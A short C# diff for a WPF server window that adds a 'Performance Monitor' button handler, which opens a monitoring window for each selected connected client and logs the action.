@@ -785,6 +785,18 @@ public partial class ServerWindow : Window
         Log($"[*] Device Manager opened for {clients.Count} client(s).");
     }
 
+    private async void PerformanceMonitor_Click(object sender, RoutedEventArgs e)
+    {
+        var clients = GetSelectedClients();
+        if (clients.Count == 0 || _server == null) return;
+        foreach (var c in clients)
+        {
+            OpenFeatureWindow<PerformanceMonitorWindow>(c.Id, () => new PerformanceMonitorWindow(_server, c.Id, c.Id));
+            if (clients.Count > 1) await Task.Delay(80);
+        }
+        Log($"[*] Performance Monitor opened for {clients.Count} client(s).");
+    }
+
     private void SelectAll_Click(object sender, RoutedEventArgs e)
     {
         GridClients.SelectAll();
